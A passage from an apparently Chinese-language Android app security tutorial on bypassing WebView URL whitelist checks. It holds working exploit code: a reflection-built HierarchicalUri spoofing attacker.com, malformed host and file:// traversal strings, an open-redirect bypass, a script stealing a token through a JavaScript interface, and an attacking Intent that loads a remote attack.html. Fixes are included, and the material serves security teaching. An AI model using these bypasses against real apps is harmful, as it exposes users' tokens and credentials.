class="number">4</span>.可正常访问的畸形路径：<span class="keyword">file</span>:sdcard<span class="regexp">/attack/</span>html” 或 “<span class="keyword">file</span>:<span class="regexp">/\//</span>sdcard/attack.html</span><br></pre></td></tr></table></figure><p><strong>常见的url检验</strong></p><p>url中会对首尾进行校验</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(host.endsWith(&quot;mysite.com&quot;))&#123;</span><br><span class="line">    <span class="built_in">enableJavascriptInterface</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在问题：endsWith未闭合点号</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite<span class="selector-class">.com</span>  <span class="comment">//恶意域名</span></span><br><span class="line">修复：<span class="built_in">endsWith</span>(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用startsWith，contains，indexOf，正则匹配等非严格字符串匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">    enableJavascriptInterface();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">绕过：mysite.com<span class="meta">@oppo</span>.com</span><br></pre></td></tr></table></figure><p>contains +indexOf绕过：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">子路径 mysite.<span class="keyword">com</span>/huawei.<span class="keyword">com</span></span><br><span class="line">参数 mysite.<span class="keyword">com</span>/xxxx#huawei.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><p><strong>//和第一个/之间提取host</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">http://huawei.com@www.rebeyond.net/poc.htm</span><br><span class="line">http://<span class="variable">a:a</span>@www.huawei.<span class="keyword">com</span>:b@www.baidu.<span class="keyword">com</span> 在android中使用getHost获取到的是huawei.<span class="keyword">com</span>,但实际访问的是baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.VIEW</span> -d URI的值  启动这个url</span><br></pre></td></tr></table></figure><h5 id="hearachical-Uri绕过"><a href="#hearachical-Uri绕过" class="headerlink" title="hearachical Uri绕过"></a>hearachical Uri绕过</h5><p>假设我们加载的uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical 来绕过</p><p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">   webView.loadUrl(uri.toString(), getAuthHeaders()); <span class="comment">//getAuthHeaders()请求头信息</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>android.net.Uri在Android被广泛使用，但实际上他是一个抽象类 android.net.Uri$HierarchicalUri是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p><p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<code>https://legitimate.com@attacker.com</code>的HierachicalUri实例即可绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件<code>TestActivity.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"> </span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞防护：</strong></p><p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p><p>Uri uri = Uri.parse(intent.getData().toString());</p><p>从 API 级别 28 (Android 9) 开始，<a href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p><h5 id="URL-Scheme绕过"><a href="#URL-Scheme绕过" class="headerlink" title="URL Scheme绕过"></a>URL Scheme绕过</h5><p><strong>漏洞原理</strong></p><p>代码在进行url校验时，检查了host，但是未检查Scheme，这样我们就可以通过“javascript”绕过。</p><p>例如：</p><p>相当于执行了一行js代码，第一行通过//符号来骗过java.net.URI获取到值为www.mysite.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=’<a href="http://www.bing.com’">http://www.bing.com’</a></p><p><img src="2025-01-15-App安全分析指南/905443_CY63B8H4GFW7TGH.png" alt="image-20220730132455921"></p><p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p><p>其中 <strong>window.location.href</strong></p><ul><li>是javascript中一个非常常用的属性，它用于获取或设置当前窗口或标签页面的URL。这个属性<strong>返回完整的URL</strong></li></ul><p><strong>漏洞复现</strong></p><p><img src="2025-01-15-App安全分析指南/905443_6G9TXKBZB6B63JZ.png" alt="image-20220730132644522"></p><p>然后进行构造html<br><img src="2025-01-15-App安全分析指南/905443_47T7BWXAEHJ3XRX.png" alt="image-20220730132704180"></p><p><strong>安全防护</strong></p><p>URL校验函数</p><p><img src="2025-01-15-App安全分析指南/905443_JGTPHZEGNU7BAGX.png" alt="image-20220730132918854"></p><p><strong>Intent Scheme校验建议写法</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> Intent <span class="built_in">int</span>ent = Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">int</span>ent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> <span class="built_in">int</span>ent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> <span class="built_in">int</span>ent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(<span class="built_in">int</span>ent，<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><h5 id="服务器跳转漏洞绕过"><a href="#服务器跳转漏洞绕过" class="headerlink" title="服务器跳转漏洞绕过"></a><strong>服务器跳转漏洞绕过</strong></h5><p><strong>漏洞原理</strong></p><p>白名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调用JavascriptInterface，例如我们构造一个这样的URL</p><p><code>https:</code>/<code>/</code>www.site1.com<code>/</code>redirect.php?url<code>=</code>https:<code>/</code>/<code>www.baidu.com</code></p><p>前面的https:<code>/</code>/<code>www.site1.com</code>/<code>redirect.php</code>是我们构造的虚拟站点，当主机访问时，打开这个url后，服务器会返回一个302响应，然后浏览器会请求指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p><p>然后我们就可以构造URL来绕过域名白名单：</p><p><code>https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</code></p><p><strong>漏洞复现</strong></p><p>首先我们编写攻击的htm：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后我们使用文件服务器来进行模拟<img src="2025-01-15-App安全分析指南/905443_ABKZHS9QBDVBZH8.png" alt="image-20220730114753663"></p><p>我们接着编写测试样本代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"> </span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p><p><code>https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</code></p><h5 id="file协议绕过"><a href="#file协议绕过" class="headerlink" title="file协议绕过"></a>file协议绕过</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView白名单绕过/">Android WebView URL检查绕过</a></p><p>app经常会使用file://协议加载本地文件，通常会限制在一些特定的路径中，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="regexp">//</span>”)来判断是否为file协议，因为“FILE:<span class="regexp">//</span>”(大小)、“File:<span class="regexp">//</span>”(大小写)、“ file:<span class="regexp">//</span>”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file:<span class="regexp">//</span>”)更不靠谱，推荐使用getScheme()来判断协议；</span><br><span class="line">(<span class="number">2</span>)file:<span class="regexp">//</span><span class="regexp">/android_asset和file:/</span><span class="regexp">//</span>android_res 也可以../穿越</span><br><span class="line">(<span class="number">3</span>)白名单判断了“..<span class="regexp">/，但通过“..\”也是可以穿越的，例如file:/</span><span class="regexp">//</span>sdcard<span class="regexp">/..\../</span>sdcard/<span class="number">1</span>.html</span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="regexp">//</span>a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span><br><span class="line">(<span class="number">5</span>)file:<span class="regexp">//</span>baidu.com<span class="regexp">/data/</span>data/tmp 前边的baidu.com是可以不被解析的</span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="regexp">//</span><span class="regexp">/，还是仍然能够正常loadUrl，如file:mnt/</span>sdcard/filedomain.html</span><br><span class="line">(<span class="number">7</span>)白名单判断了“..<span class="regexp">/”，但通过url编码绕过，例如file:/</span><span class="regexp">//</span>data<span class="regexp">/data/</span>com.app<span class="regexp">/%2e%2e/</span>%<span class="number">2</span>e%<span class="number">2</span>e<span class="regexp">/%2e%2e/</span>sdcard/xxx</span><br><span class="line">(<span class="number">8</span>)replace(“..<span class="regexp">/“,””) 可以使用”…./</span><span class="regexp">/“绕过  替换一个../</span> 还有../存在</span><br></pre></td></tr></table></figure><h4 id="Intent-WebView"><a href="#Intent-WebView" class="headerlink" title="Intent + WebView"></a>Intent + WebView</h4><h5 id="Intent访问导出组件加载恶意界面和窃取信息"><a href="#Intent访问导出组件加载恶意界面和窃取信息" class="headerlink" title="Intent访问导出组件加载恶意界面和窃取信息"></a><strong>Intent访问导出组件加载恶意界面和窃取信息</strong></h5><p><strong>漏洞原理</strong></p><p>主要通过WebView对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p><p><strong>漏洞复现</strong></p><p>样例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p><p>我们将该组件设置为导出组件</p><p><img src="2025-01-15-App安全分析指南/905443_8793MBMDUVDZESQ.png" alt="image-20220729171422196"></p><p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p><p>编写攻击样本:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 